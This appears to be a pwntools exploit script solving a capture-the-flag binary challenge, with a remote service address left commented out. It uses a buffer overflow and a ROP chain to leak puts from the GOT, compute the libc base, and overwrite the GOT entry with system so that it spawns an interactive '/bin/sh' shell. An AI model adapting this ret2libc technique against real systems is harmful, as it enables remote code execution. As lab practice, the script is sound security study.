from pwn import *
context.arch = 'amd64'

r = process("./share/chal")
# r = remote("10.113.184.121", 10053)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
bss = 0x403890 # writeable address
ret = 0x40101a
pop_rdi = 0x401263 # dynamic link 只需要控制一個return address
puts_plt = 0x401070
puts_got = 0x403368
gets_plt = 0x401090
leave_ret = 0x4011f3
payload = 0x28 * b'a'
payload += flat([pop_rdi, puts_got, puts_plt, pop_rdi, bss, gets_plt, pop_rdi, puts_got, gets_plt, pop_rdi, bss, puts_plt])

r.recvuntil(b'best :')
raw_input()
r.sendline(payload)
r.recvuntil(b'boom !\n')
puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
info(f"puts_addr: {hex(puts_addr)}")
libc_base = puts_addr - libc.symbols['puts']
libc.address = libc_base
system_addr = libc.symbols['system']
info(f"system_addr: {hex(system_addr)}")
r.sendline(b'/bin/sh\x00')
r.sendline(p64(libc.symbols['system']))
r.interactive()